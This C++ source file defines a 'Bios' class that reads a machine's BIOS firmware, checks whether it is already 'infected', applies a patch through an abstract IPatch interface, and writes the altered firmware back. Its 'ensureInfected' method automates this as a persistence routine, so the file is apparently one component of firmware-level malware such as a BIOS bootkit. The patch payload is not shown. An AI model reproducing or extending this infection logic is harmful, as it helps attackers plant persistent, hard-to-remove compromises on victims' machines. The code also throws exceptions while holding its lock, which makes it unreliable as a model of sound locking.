#include "Bios.hpp"
#include "../logs/LogLevel.hpp"
#include "../exceptions/IllegalStateException.hpp"

Bios::Bios() {
}

void Bios::setLock(IReentrantLock * pLock) {
    this->pLock = pLock;
}
void Bios::setLog(ILog * pLog) {
    this->pLog = pLog;
}
void Bios::setBiosIO(IBiosIO *pBiosIO) {
    this->pBiosIO = pBiosIO;
}
void Bios::setPatch(IPatch *pPatch) {
    this->pPatch = pPatch;
}
void Bios::setBiosBytesVector(IBiosVector * pBiosBytesVector) {
    this->pBiosBytesVector = pBiosBytesVector;
}

void Bios::read() {
    pLock->lock();
    pLog->logMessage(INFO, "Bios::read()");
    pBiosBytesVector->init(pBiosIO->readAsBytes());
    pLock->unlock();
}
bool Bios::isReaded() {
    pLog->logMessage(INFO, "Bios::isReaded() before lock");
    pLock->lock();
    pLog->logMessage(INFO, "Bios::isReaded() after lock");
    bool result = !pBiosBytesVector->isEmpty();
    pLock->unlock();
    return result;
}
void Bios::write() {
    pLock->lock();
    pLog->logMessage(INFO, "Bios::write()");
    if(!isReaded()) {
        throw IllegalStateException("trying to write BIOS which have not been read");
    }
    if (!pBiosBytesVector->isModified()) {
        throw IllegalStateException("trying to write BIOS which have not been modified");
    }
    pBiosIO->writeFromBytesArray(pBiosBytesVector->asArray());
    pLock->unlock();
}
bool Bios::isInfected() {    
    pLock->lock();
    pLog->logMessage(INFO, "Bios::isInfected()");
    if(!isReaded()) {
        pLog->logMessage(INFO, "Bios::isInfected() !isReaded");
        read();
        pLog->logMessage(INFO, "Bios::isInfected() after Read");
    }
    bool isInfected = pPatch->isPatched(*pBiosBytesVector);
    pLock->unlock();
    return isInfected;
}
void Bios::infect() {
    pLock->lock();
    pLog->logMessage(INFO, "Bios::infect()");
    if (!isReaded()) {
        read();
    }
    if (isInfected()) {
        throw IllegalStateException("trying to infect already infected BIOS");
    }
    pPatch->patch(*pBiosBytesVector);
    pLock->unlock();
}
void Bios::ensureInfected() {
    pLock->lock();
    pLog->logMessage(INFO, "Bios::ensureInfected()");
	read();
	if (!isInfected()) {
		infect();
		write();
	}
    pLock->unlock();
}

void Bios::clear() {
    pLock->lock();
    pLog->logMessage(INFO, "Bios::clear()");
    pBiosBytesVector->clear();
    pLock->unlock();
}
